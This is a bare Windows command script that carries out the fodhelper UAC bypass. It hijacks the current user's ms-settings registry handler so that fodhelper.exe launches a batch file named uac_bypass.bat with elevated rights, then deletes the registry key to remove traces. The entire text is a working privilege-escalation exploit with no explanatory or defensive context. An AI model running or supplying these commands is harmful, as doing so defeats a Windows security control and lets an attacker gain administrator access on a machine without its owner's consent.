reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d C:\Users\piyuzz\Desktop\uac_bypass.bat /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
timeout /t 5
reg delete HKCU\Software\Classes\ms-settings /f
